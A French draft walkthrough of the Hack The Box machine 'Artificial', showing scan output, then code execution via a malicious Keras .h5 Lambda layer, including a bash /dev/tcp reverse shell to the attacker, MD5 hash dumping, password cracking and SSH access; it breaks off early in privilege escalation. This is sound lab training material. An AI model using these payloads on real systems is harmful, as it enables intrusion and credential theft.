---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Artificial — HTB Easy Writeup & Walkthrough"
linkTitle: "Artificial"
slug: "artificial"
date: 2026-04-25T10:14:07+02:00
#lastmod: 2026-04-25T10:14:07+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Easy","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Artificial"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Artificial"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Artificial> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) révèle les ports ouverts suivants :

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt artificial.htb
Nmap scan report for artificial.htb (10.129.x.x)
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 6.83 seconds

```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : artificial.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour artificial.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "artificial.htb"

# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt artificial.htb
Nmap scan report for artificial.htb (10.129.x.x)
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   58.95 ms 10.10.x.x
2   6.72 ms  artificial.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 25 10:06:27 2026 -- 1 IP address (1 host up) scanned in 14.80 seconds

```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt artificial.htb
Nmap scan report for artificial.htb (10.129.x.x)
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Artificial - AI Solutions
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 3
|     /static/css/
|       css: 1
|     /static/js/
|       js: 1
|   Longest directory structure:
|     Depth: 2
|     Dir: /static/css/
|   Total files found (by extension):
|_    Other: 3; css: 1; js: 1
| http-headers: 
|   Server: nginx/1.18.0 (Ubuntu)
|   Date: Sat, 25 Apr 2026 08:06:34 GMT
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 5442
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 36.73 seconds

```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt artificial.htb
Nmap scan report for artificial.htb (10.129.x.x)
Host is up (0.010s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 10.20 seconds

```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb artificial.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt`  regroupe les chemins découverts, sans parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.2

Cible        : artificial.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://artificial.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/artificial.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/artificial.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/artificial.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/artificial.htb/ffuf_files.json 2>&1 | tee scans_recoweb/artificial.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://artificial.htb/dashboard (CODE:302|SIZE:199)
http://artificial.htb/dashboard/ (CODE:302|SIZE:199)
http://artificial.htb/login (CODE:200|SIZE:857)
http://artificial.htb/login/ (CODE:200|SIZE:857)
http://artificial.htb/logout (CODE:302|SIZE:189)
http://artificial.htb/logout/ (CODE:302|SIZE:189)
http://artificial.htb/register (CODE:200|SIZE:952)
http://artificial.htb/register/ (CODE:200|SIZE:952)

=== Détails par outil ===

[DIRB]
http://artificial.htb/dashboard (CODE:302|SIZE:199)
http://artificial.htb/login (CODE:200|SIZE:857)
http://artificial.htb/logout (CODE:302|SIZE:189)
http://artificial.htb/register (CODE:200|SIZE:952)

[FFUF — DIRECTORIES]
http://artificial.htb/dashboard/ (CODE:302|SIZE:199)
http://artificial.htb/login/ (CODE:200|SIZE:857)
http://artificial.htb/logout/ (CODE:302|SIZE:189)
http://artificial.htb/register/ (CODE:200|SIZE:952)

[FFUF — FILES]

```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
=== mon-subdomains artificial.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : [date]
Domaine      : artificial.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=302 size=154 words=10 (Host=bwg02cmdzi.artificial.htb)
  Baseline#2: code=302 size=154 words=10 (Host=p0y7gkag0w.artificial.htb)
  Baseline#3: code=302 size=154 words=10 (Host=de4wfhnv5u.artificial.htb)
  After-redirect#1: code=200 size=5442 words=472
  After-redirect#2: code=200 size=5442 words=472
  After-redirect#3: code=200 size=5442 words=472
  VHOST (0)
    - (aucun)



=== mon-subdomains artificial.htb END ===


```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

À l’issue de l’énumération, la surface d’attaque se limite à un service web exposé sur le port 80, accompagné d’un accès SSH sur le port 22.

L’application web, intitulée "Artificial - AI Solutions", ne repose sur aucun CMS identifié et semble être une implémentation custom. Les chemins découverts (`/login`, `/register`, `/dashboard`, `/logout`) indiquent la présence d’un système d’authentification avec espace utilisateur.

Aucune vulnérabilité évidente n’est détectée automatiquement, ce qui oriente l’analyse vers une faille applicative nécessitant une interaction directe avec les fonctionnalités proposées par le site.

À partir des endpoints identifiés, tu vas maintenant interagir avec l’application en commençant par créer un compte via `/register`, puis en testant l’authentification sur `/login` afin d’accéder à l’espace utilisateur (`/dashboard`).

![Page d’accueil Artificial HTB avec exemple de code Python TensorFlow et présentation d’une plateforme de test de modèles d’intelligence artificielle](home-page.png)



![Page d’inscription Artificial HTB avec formulaire de création de compte (username, email, mot de passe)](register.png)



![Page de connexion Artificial HTB avec formulaire d’authentification utilisateur (email et mot de passe)](login.png)



![Dashboard Artificial HTB après authentification avec interface d’upload de modèles AI et gestion des fichiers](dashboard.png)



Le formulaire d’upload impose le format `.h5`, ce qui indique que seuls des modèles Keras/TensorFlow peuvent être envoyés via l’interface *Browse*.

![alt="Interface d'upload de modèle .h5 Keras utilisée pour exploiter une exécution de code dans Artificial HTB"](h5-upload.png)

Le format `.h5` correspond à un fichier de modèle Keras basé sur HDF5. Ce type de fichier n’est pas un simple format statique : il peut contenir des structures complexes utilisées lors du chargement du modèle.

Dans certaines configurations, le chargement d’un modèle Keras via `load_model()` peut entraîner l’exécution de code si le fichier est malveillant ou manipulé.

Cela en fait une surface d’attaque potentielle intéressante à tester.

À partir de cette observation, tu vas chercher à créer un fichier `.h5` contrôlé afin de vérifier si le serveur charge réellement le modèle côté backend, et si ce chargement peut être détourné pour exécuter du code.

### Création d'un environnement de travail local

Tu commences par vérifier si `TensorFlow` est déjà installé sur ton système local :

```bash
pip3 show tensorflow
WARNING: Package(s) not found: tensorflow
```

Aucune installation de `TensorFlow`  n’est détectée. Or, le fichier `requirements.txt` fourni par l’application impose une version précise :

```txt
tensorflow-cpu==2.13.1
```

> Même si `TensorFlow`  était déjà présent sur le système, un écart de version représenterait un risque d’incompatibilité.

Installer `TensorFlow`  localement peut s’avérer fastidieux et n’est pas nécessaire : le `Dockerfile` fourni par le `dashboard` décrit précisément l’environnement attendu (**Python 3.8 + TensorFlow 2.13.1**).

Tu t’appuies donc sur ce `Dockerfile` pour recréer un environnement de travail identique à celui du serveur.

Cela te permet de générer des modèles `.h5` compatibles avec l’application cible.

#### Création du conteneur Docker

À partir du `Dockerfile` récupéré, tu construis une image Docker :

```bash
docker build -t artificial-tf .
```

Cette commande crée une image nommée `artificial-tf` contenant l’environnement Python 3.8 + TensorFlow 2.13.1.

#### Lancement du conteneur

Tu démarres ensuite un conteneur interactif en liant ton répertoire local Kali au répertoire de travail du conteneur :

```bash
docker run --privileged -it -v $(pwd):/code artificial-tf
```

- L’option `-it` permet d’obtenir un shell interactif dans le conteneur.

- L’option `--privileged` donne des droits étendus au conteneur, ce qui évite des limitations qui pourraient gêner les tests dans ton environnement local.

Le conteneur s’exécute localement sur ta machine Kali, et le répertoire courant est monté dans `/code` à l’intérieur du conteneur.

Cela te permet de créer les fichiers `.h5` depuis le conteneur tout en les retrouvant directement dans ton répertoire local sur Kali.

> **Note**: Les fichiers `.h5` et scripts Python utilisés sont disponibles dans la section [Pièces jointes](#pièces-jointes).

### Génération d’un modèle minimal

Avant de créer des fichiers POC `.h5` (preuve de concept), tu commences par générer un modèle Keras minimal et valide.

L’objectif est de vérifier que l’environnement Docker fonctionne correctement et que tu peux produire un fichier `.h5` compatible avec ce que l’application attend.

Dans le conteneur, tu installes d’abord un éditeur de texte, par exemple `nano` :

```bash
apt update
apt install -y nano

```

Tu peux ensuite créer tes scripts Python directement dans le conteneur :

```bash
nano minimal.py
```

Puis tu ajoutes le code suivant, inspiré de l’exemple fourni sur le dashboard et simplifié au strict minimum :

```python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

model = keras.Sequential([
    layers.Dense(1, input_shape=(1,))
])

model.compile(optimizer="adam", loss="mean_squared_error")

model.save("minimal.h5")
```

Tu exécutes ensuite le script **dans le conteneur** :

```bash
python3 minimal.py
ls -lh minimal.h5
```

Si le fichier `minimal.h5` est bien généré, cela confirme que ton environnement local est correctement configuré.

Une fois le fichier `minimal.h5` généré, tu le testes directement via l’interface web.  
Depuis le dashboard, tu sélectionnes le fichier avec le bouton **Browse**, puis tu l’uploades.

Après l’upload, tu cliques sur **View Predictions** afin de déclencher le chargement du modèle côté serveur.



![Interface du dashboard Artificial HTB montrant un modèle .h5 uploadé avec les boutons "View Predictions" et "Delete" permettant de tester le chargement du modèle côté serveur](view-predictions.png)

Si aucune erreur n’est affichée et que la page **Model Predictions** s’ouvre, cela confirme que le modèle est accepté et correctement traité par l’application.  

Tu peux alors considérer que ton environnement local est conforme et passer à la création de fichiers `.h5` de preuve de concept.



### Preuve de concept : poc-touch.h5

Pour créer un premier modèle POC, tu t’inspires d’une recherche simple sur le sujet, par exemple avec les mots-clés `keras tensorflow RCE`.

Cette recherche met en évidence qu’il est possible d’exécuter du code lors du chargement d’un modèle Keras, notamment via l’utilisation de couches `Lambda`.

Tu peux notamment t’appuyer sur les travaux décrits ici :  
https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

Tu adaptes ensuite ce principe à ton script `minimal.py` afin de créer une première preuve de concept simple.

#### Création de poc-touch.h5

Le but de ce premier PoC est volontairement simple : créer un fichier dans `/tmp` si le code est bien exécuté.

Pour cela tu crées d'abord un script `poc-touch.py` :

```bash
nano poc-touch.py
```

Tu ajoutes le code suivant, qui te permettra de vérifier si la fonction `payload` est bien exécutée :

```python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers
import os

def payload(x):
    os.system("touch /tmp/poc_touch")
    return x

model = keras.Sequential([
    layers.Input(shape=(1,)),
    layers.Lambda(payload)
])

model.save("poc-touch.h5")
```

Tu exécutes ensuite le script pour générer le fichier `.h5` :

```bash
python3 poc-touch.py
ls -lh poc-touch.h5

```

Le fichier `poc-touch.h5` est maintenant prêt pour un premier test local dans l’environnement Docker.

#### Test de `poc-touch.h5` en local

Tout ce test se déroule dans le conteneur Docker local.

L’objectif est de valider le comportement du fichier `.h5` dans l’environnement de travail recréé à partir du `Dockerfile`, avant toute interaction avec la cible.

Pour tester ce modèle en local, tu crées un script Python qui prend le fichier `.h5` en argument et le charge.

```bash
nano test_model.py
```

Tu ajoutes le code suivant :

```python
import sys
from tensorflow import keras

model_path = sys.argv[1]

model = keras.models.load_model(model_path)
print("Modèle chargé")
```

Tu exécutes ensuite le script avec ton fichier :

```bash
python3 test_model.py poc-touch.h5
```

Si le chargement du modèle déclenche l’exécution de la fonction `payload`, le fichier `/tmp/poc_touch` doit être créé.

Tu peux le vérifier avec :

``` bash
ls -l /tmp/poc_touch
```

### Preuve de concept : poc-ping.h5

Pour tester la RCE depuis la cible, il faut que le fichier `.h5` déclenche une action observable depuis Kali.

Une méthode simple consiste à générer un modèle qui exécute un `ping` vers ta machine Kali.  
Si le ping est détecté côté Kali, cela confirme que le modèle est bien chargé par le serveur et que l’exécution de code fonctionne à distance.

Pour pouvoir utiliser la commande `ping` dans le conteneur, tu installes d’abord l’outil correspondant :

```bash
apt update
apt install -y iputils-ping
```



#### Création de `poc-ping.h5`

Pour préparer ce test, tu crées un nouveau script Python dans le conteneur :

```bash
nano poc-ping.py
```

Ce script reprend le principe de `poc-touch.py`, mais remplace la création d’un fichier local par une action réseau visible depuis Kali.

Tu ajoutes le code suivant, en remplaçant `10.10.x.x` par l’adresse IP `tun0` de ta machine Kali :

```python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

def payload(x):
    import os
    os.system("ping -c 3 10.10.x.x")
    return x

model = keras.Sequential([
    layers.Input(shape=(1,)),
    layers.Lambda(payload)
])

model.save("poc-ping.h5")
```


Tu génères ensuite le fichier `.h5` :

```bash
python3 poc-ping.py
ls -lh poc-ping.h5
```

#### Test de `poc-ping.h5` en local

Ce test se déroule entièrement dans le conteneur Docker local.

Avant de charger le modèle, tu démarres une capture réseau dans un fenêtre de ton Kali pour observer les paquets ICMP :

```bash
sudo tcpdump -i any icmp
```

Dans ton conteneur Docker, tu exécutes ensuite le script de test avec ton modèle :

```bash
python3 test_model.py poc-ping.h5
```

Si la fonction `payload` est exécutée, 3 requêtes `ping` sont envoyées vers Kali.

Tu dois alors voir apparaître **6 paquets ICMP** dans `tcpdump` :

- 3 requêtes (echo request)
- 3 réponses (echo reply)

Cela confirme que le modèle déclenche bien une action réseau lors de son chargement.

#### Test de `poc-ping.h5` en remote

Une fois le test local validé, tu peux vérifier le comportement du modèle sur la cible.

Sur ta machine Kali, tu démarres une capture réseau pour surveiller les paquets ICMP :

```bash
sudo tcpdump -i tun0 icmp
```

Depuis le `dashboard` de l’application, tu uploades le fichier `poc-ping.h5`, puis tu cliques sur `View Predictions` afin de déclencher le chargement du modèle côté serveur.

Si la fonction `payload` est exécutée, des requêtes `ping` doivent être envoyées vers ta machine Kali.

Ici aussi tu dois voir apparaître **6 paquets ICMP** dans `tcpdump` :

- 3 requêtes (echo request)
- 3 réponses (echo reply)

La réception de ces paquets ICMP confirme que :
- le modèle `.h5` est bien chargé par le serveur
- le code `ping` est exécuté côté cible

### Exploitation : reverse-shell.h5

Une fois la RCE confirmée avec `poc-ping.h5`, tu peux passer à l’étape suivante : obtenir un accès distant sur la machine cible.

L’objectif est de remplacer la commande `ping` par un reverse shell, afin que la cible initie une connexion vers ta machine Kali.

#### Création de reverse-shell.py

Tu reprends le principe utilisé précédemment et tu crées un nouveau script :

```bash
nano reverse-shell.py
```

Tu ajoutes le code suivant, en remplaçant `10.10.x.x` par l’adresse IP `tun0` de ta machine Kali :

```python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

def payload(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'")
    return x

model = keras.Sequential([
    layers.Input(shape=(1,)),
    layers.Lambda(payload)
])

model.save("reverse-shell.h5")
```



> **Note :** En cas de redémarrage ou de reset de la machine cible, l’image Docker est généralement déjà présente sur ton Kali.  
> Il n’est donc pas nécessaire de la reconstruire : un simple `docker run` suffit pour relancer l’environnement de travail.



Tu génères ensuite le fichier `.h5` :

```bash
bashpython3 reverse-shell.py
ls -lh reverse-shell.h5
```

#### Reverse Shell

Sur ta machine Kali, tu démarres un listener :

```bash
nc -lnvp 4444
```

Depuis l’interface web, tu uploades le fichier `reverse-shell.h5` via le bouton `Browse` et `Upload Model`, puis tu cliques sur `View Predictions` afin de déclencher son exécution.

Si tout se passe correctement, une connexion entrante apparaît dans ton listener : le reverse shell est établi sur ta machine Kali.

```bash
app@artificial:~/app$ whoami
whoami
app
app@artificial:~/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@artificial:~/app$ pwd
pwd
/home/app/app
app@artificial:~/app$
```

Une fois le reverse shell obtenu, tu peux le stabiliser en appliquant la recette {{< recette "stabiliser-reverse-shell" >}}

### Exploitation du reverse shell

#### Énumération initiale

Une fois le reverse shell établi et stabilisé, tu commences par une énumération de base du système :

```bash
whoami
id
pwd
uname -a
ls -la
```

L’utilisateur courant est `app`, et tu te trouves dans le répertoire de l’application.

#### Identification des utilisateurs

Tu explores ensuite les répertoires utilisateurs :

``` bash
ls -l /home
```

On observe la présence d’un seul autre utilisateur : `gael`.

Tu peux également confirmer avec :

```bash
cat /etc/passwd
```

Le fichier `user.txt` n’étant pas présent dans `/home/app`, il est probable qu’il se trouve dans `/home/gael`, auquel tu n’as pas accès.

L’objectif devient donc d’obtenir les droits de cet utilisateur.

#### Analyse de l’application

L’analyse du répertoire courant montre que le fichier `app.py` est lisible :

```bash
ls -la
cat app.py
```

tu trouves notamment ceci :

```python
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'models'
```

et un peu plus loin :

```python
def hash(password):
 password = password.encode()
 hash = hashlib.md5(password).hexdigest()
 return hash
```

Ce fichier révèle que l’application utilise une base de données SQLite `users.db`, contenant les identifiants des utilisateurs, avec des mots de passe hashés en MD5.

Tu recherches alors cette base de données :

``` bash
find / -name users.db 2>/dev/null
```

Le fichier est localisé dans le répertoire `instance` de l’application :

``` bash
/home/app/app/instance/users.db
```

#### Extraction des identifiants

Tu l’ouvres avec `sqlite3` :

``` bash
sqlite3 instance/users.db
```

Puis tu listes les tables et extrais les utilisateurs :

```sql
app@artificial:~/app$ sqlite3 instance/users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
model  user 
sqlite> select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|noelnac|noelnac@artificial.htb|5f4dcc3b5aa765d61d8327deb882cf99
sqlite>
```

Cela permet de récupérer le hash MD5 associé à l’utilisateur `gael`.

```sql
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
```



#### Crack du mot de passe

Tu utilises ensuite un service de crack comme CrackStation pour retrouver le mot de passe en clair.

![Interface CrackStation montrant le déchiffrement du hash MD5 de l’utilisateur gael révélant le mot de passe mattp005numbertwo](gael-crackstation.png)

Le hash est résolu en :

```text
gael : mattp005numbertwo
```

#### Accès SSH

Ces identifiants peuvent être utilisés pour établir une connexion SSH :

``` bash
ssh gael@artificial.htb
```

Une fois connecté, tu peux accéder au fichier `user.txt` dans le répertoire personnel de `gael`.



### user.txt

```bash
gael@artificial:~$ ls -l
total 4
-rw-r----- 1 root gael 33 Apr 28 08:38 user.txt


gael@artificial:~$ cat user.txt
0fb9xxxxxxxxxxxxxxxxxxxxxxxx6143
```

Une fois le fichier `user.txt` récupéré, la prise de pied est validée. Tu peux désormais passer à la phase d’escalade de privilèges.







## Escalade de privilèges

{{< escalade-intro user="gael" >}}

### Sudo -l
Tu commences toujours par vérifier les droits sudo :

### Recherche de binaires SUID
Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.

```bash
find / -perm -4000 -type f 2>/dev/null
```

La liste obtenue ne contient que des binaires système classiques tels que :

```texte
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
...
```

Tu n’identifies aucun binaire inhabituel ou directement exploitable.

### Analyse des Linux capabilities

Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.

La vérification se fait avec la commande suivante :

```bash
getcap -r / 2>/dev/null
```

Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.

### Vérification des SUID avec suid3num.py

Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :

les binaires SUID intéressants
leur présence éventuelle dans GTFOBins

Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :

```bash
cd /dev/shm
wget http://10.10.x.x:8000/suid3num.py
